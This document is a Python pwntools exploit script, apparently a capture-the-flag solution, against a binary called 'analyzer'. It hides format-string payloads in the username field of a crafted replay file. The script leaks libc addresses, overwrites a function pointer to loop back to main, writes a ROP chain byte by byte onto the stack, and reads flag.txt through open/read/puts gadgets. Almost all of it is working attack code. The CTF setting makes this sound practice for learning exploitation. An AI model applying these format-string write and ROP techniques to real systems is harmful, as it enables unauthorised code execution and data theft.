#!/usr/bin/env python3
'''
Pwn3d by pwn2ooown
'''
from pwn import *
import sys
import time
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]
# brva x = b *(pie+x)
# set follow-fork-mode 
# p/x $fs_base
# vis_heap_chunks
# set debug-file-directory /usr/src/glibc/glibc-2.35
# directory /usr/src/glibc/glibc-2.35/malloc/
# handle SIGALRM ignore
if len(sys.argv) == 1:
    r = process("./analyzer_patched")
    if args.GDB:
        # gdb.attach(r,'b *0x401ada\nb *0x0000000000401be9')
        gdb.attach(r,'b gets\n')
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
s       = lambda data               :r.send(data)
sa      = lambda x, y               :r.sendafter(x, y)
sl      = lambda data               :r.sendline(data)
sla     = lambda x, y               :r.sendlineafter(x, y)
ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
uu32    = lambda data,num           :u32(r.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(r.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))
l64     = lambda      :u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(r.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
import struct
import binascii

def encode_varint(n):
    """Encode a non-negative integer as a varint."""
    if n == 0:
        return b'\x00'
    bytes_list = []
    while n > 0:
        byte = n & 0x7F
        n >>= 7
        if n > 0:
            byte |= 0x80
        bytes_list.append(byte)
    return bytes(bytes_list)

def encode_string(s:bytes, encoding='utf-8'):
    if not s:
        return b'\x00'
    if isinstance(s, str):
        s = s.encode(encoding)
    length = len(s)
    return b'\x0b' + encode_varint(length) + s

def generate_osr_hex(mode=0, timestamp=0, hash_md5='d41d8cd98f00b204e9800998ecf8427e', username='TestUser', unknown_string='', unknown_bytes=b'\x00'*10, misses=0):
    # Mode byte
    data = bytes([mode])
    
    # 4 bytes timestamp (little-endian uint32)
    data += struct.pack('<I', timestamp)
    
    # Hash string
    data += encode_string(hash_md5)
    
    # Username string
    data += encode_string(username)
    
    # Unknown string (empty)
    data += encode_string(unknown_string)
    
    # 10 unknown bytes
    data += unknown_bytes
    
    # Misses short (little-endian)
    data += struct.pack('<h', misses)
    
    # Convert to hex string without spaces or newlines
    hex_dump = binascii.hexlify(data).decode('ascii')
    return hex_dump

def send_payload(name:bytes):
    sla("./analyzer):",generate_osr_hex(username=name, misses=0))

# [0x404060] seccomp_release -> 0x4010c0 ◂— endbr64
aaa = 0x1749 - 14
print(aaa)
# leak and change seccomp_release to main
send_payload(b"%3$p%"+str(aaa).encode()+b"c%19$hn"+b"aaaaaaaa"+p64(0x404060))
ru("0x")
libc = int(r.recv(12),16)-0x1148f7

def writebyte(addr,data):
    payload777 = b"%"+str(data).encode() + b"c%18$hhn"
    payload777 += b'a' * (16-len(payload777))
    payload777 += p64(addr)
    send_payload(payload777)
def read8(addr,data=5):
    payload777 = b"pwn2ooown%18$s"
    payload777 += b'a' * (16-len(payload777))
    payload777 += p64(addr)
    send_payload(payload777)

read8(libc+0x21ba20)
ru("pwn2ooown")
returnaddr = u64(r.recv(6)+b'\x00\x00') - 0x110
def write6bytes(addr,chainbytes):
    writebyte(addr,chainbytes[0])
    writebyte(addr+1,chainbytes[1])
    writebyte(addr+2,chainbytes[2])
    writebyte(addr+3,chainbytes[3])
    writebyte(addr+4,chainbytes[4])
    writebyte(addr+5,chainbytes[5])
# write gets(buf) to read a longer ROP chain
pop_rdi = libc + 0x16efb4
pop_rsi = libc+0x149618
pop_rdx_r12 = libc+0x0013b6b9
gets = libc+0x80520
leave_ret = libc+0x00133c5a
pop_rbp_ret = libc+0x1bba6d
open = libc+0x114550
read = libc+0x114840
puts = libc+0x80e50
write6bytes(returnaddr,p64(pop_rdi)[:6])
send_payload(b"%1c%18$lln"+b'a' * 6+p64(returnaddr+8))
writebyte(returnaddr+8,0x40)
writebyte(returnaddr+9,0x41)
writebyte(returnaddr+10,0x40)
write6bytes(returnaddr+16,p64(gets)[:6])
write6bytes(returnaddr+24,p64(pop_rbp_ret)[:6])
send_payload(b"%1c%18$lln"+b'a' * 6+p64(returnaddr+32))
writebyte(returnaddr+32,0x38)
writebyte(returnaddr+33,0x41)
writebyte(returnaddr+34,0x40)
write6bytes(returnaddr+40,p64(leave_ret)[:6])
flag_path = 0x4041c0
# pause()
send_payload(b"%"+str(0x1bea).encode()+b"c%18$hn"+b"aaaa"+p64(0x404060)) # turn seccomp_release back
# longer rop chain
sla("You didn't miss!",p64(pop_rdi)+p64(flag_path)+p64(pop_rsi)+p64(0)+p64(open)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(0x404200)+p64(pop_rdx_r12)+p64(0x100)+p64(0)+p64(read)+p64(pop_rdi)+p64(0x404200)+p64(puts)+b"flag.txt")
leak("libc",hex(libc))
leak("returnaddr",hex(returnaddr))

r.interactive()